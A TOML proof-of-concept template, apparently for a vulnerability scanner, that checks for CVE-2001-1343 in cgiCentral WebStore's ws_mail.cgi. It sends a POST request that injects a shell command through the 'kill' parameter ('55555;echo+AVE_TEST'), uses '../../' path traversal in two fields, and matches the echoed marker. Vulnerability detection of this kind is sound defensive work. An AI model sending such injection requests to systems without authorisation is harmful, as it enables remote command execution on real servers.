[info]
author = "AVE"
description = "检测 cgiCentral WebStore 400/400CS 4.14 中 ws_mail.cgi 的任意命令执行漏洞。通过向 kill 参数注入 shell 元字符，验证服务器是否执行了攻击者控制的命令。"
id = "POC-AVE-2001-0536"
name = "cgiCentral WebStore 400 ws_mail.cgi Arbitrary Command Execution PoC"
severity = "high"
tags = [
    "cve-2001-1343",
    "webstore",
    "rce",
    "cgi",
]
vuln_id = [
    "CVE-2001-1343",
    "AVE-2001-0536",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/ws_mail.cgi"
protocol = "http"

[poc.requests.body]
content = "userfile=../../Statistics/WebStore_Access.counter&kill=55555;echo+AVE_TEST&terminate=whatever&admin=yep&restart=pls&msgfile=../../Statistics/WebStore_Access.counter"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVE_TEST"]
